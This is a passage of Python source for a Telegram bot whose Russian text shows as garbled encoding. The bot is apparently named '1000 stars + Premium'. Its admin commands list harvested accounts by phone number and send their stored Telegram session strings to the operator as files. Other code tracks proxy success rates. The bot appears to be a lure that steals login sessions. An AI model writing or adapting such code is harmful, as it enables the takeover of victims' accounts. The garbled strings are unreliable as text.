                temp_file = os.path.join(SESSIONS_FOLDER, f"session_{account_id}.txt")
                with open(temp_file, 'w', encoding='utf-8') as f:
                    f.write(session_string)
                
                with open(temp_file, 'rb') as f:
                    bot.send_document(
                        ADMIN_ID, 
                        f, 
                        caption=f"üíæ –°–µ—Å—Å–∏—è #{account_id}\nüì± {phone}"
                    )
                
                os.remove(temp_file)
            else:
                bot.send_message(ADMIN_ID, f"‚ùå –°–µ—Å—Å–∏—è #{account_id} –Ω–µ –Ω–∞–π–¥–µ–Ω–∞")
                
        except Exception as e:
            bot.send_message(ADMIN_ID, f"‚ùå –û—à–∏–±–∫–∞: {e}")

@bot.message_handler(commands=['list_sessions'])
def list_sessions(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        conn = sqlite3.connect(os.path.join(DATA_FOLDER, 'accounts.db'))
        c = conn.cursor()
        c.execute("""SELECT id, phone, auth_status, last_attempt 
                     FROM accounts 
                     WHERE session_string IS NOT NULL 
                     ORDER BY id DESC LIMIT 15""")
        sessions = c.fetchall()
        conn.close()
        
        if not sessions:
            bot.send_message(ADMIN_ID, "üì≠ –°–µ—Å—Å–∏–π –Ω–µ—Ç")
            return
        
        msg = "üìã *–°–ï–°–°–ò–ò:*\n\n"
        for sess in sessions:
            msg += f"üÜî #{sess[0]}\n"
            msg += f"üì± {sess[1]}\n"
            msg += f"‚úÖ {'–ê–∫—Ç–∏–≤–Ω–∞' if sess[2] == 'success' else '–û—à–∏–±–∫–∞'}\n"
            msg += f"‚è∞ {sess[3][:16] if sess[3] else '–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö'}\n"
            msg += f"üîó /get_session_{sess[0]}\n"
            msg += "‚îÄ" * 20 + "\n"
        
        bot.send_message(ADMIN_ID, msg, parse_mode='Markdown')
        
    except Exception as e:
        bot.send_message(ADMIN_ID, f"‚ùå –û—à–∏–±–∫–∞: {e}")

@bot.message_handler(commands=['proxy_stats'])
def proxy_stats(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        stats = proxy_manager.proxy_stats
        if not stats:
            bot.send_message(ADMIN_ID, "üì≠ –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏ –ø—Ä–æ–∫—Å–∏ –Ω–µ—Ç")
            return
        
        msg = "üìä *–°–¢–ê–¢–ò–°–¢–ò–ö–ê –ü–†–û–ö–°–ò:*\n\n"
        for proxy, data in list(stats.items())[:10]:
            success_rate = (data['success'] / (data['success'] + data['fails'])) * 100 if (data['success'] + data['fails']) > 0 else 0
            msg += f"üîó {proxy[:30]}...\n"
            msg += f"‚úÖ {data['success']} | ‚ùå {data['fails']}\n"
            msg += f"üìà {success_rate:.1f}% | ‚è±Ô∏è {data['avg_time']:.1f}—Å\n"
            msg += "‚îÄ" * 20 + "\n"
        
        bot.send_message(ADMIN_ID, msg, parse_mode='Markdown')
        
    except Exception as e:
        bot.send_message(ADMIN_ID, f"‚ùå –û—à–∏–±–∫–∞: {e}")

# ============ –ó–ê–ü–£–°–ö ============
def run_bot():
    logger.info("ü§ñ –ë–æ—Ç '1000 –∑–≤–µ–∑–¥ + Premium' –∑–∞–ø—É—â–µ–Ω...")
    bot.infinity_polling()

if __name__ == "__main__":
    run_bot()
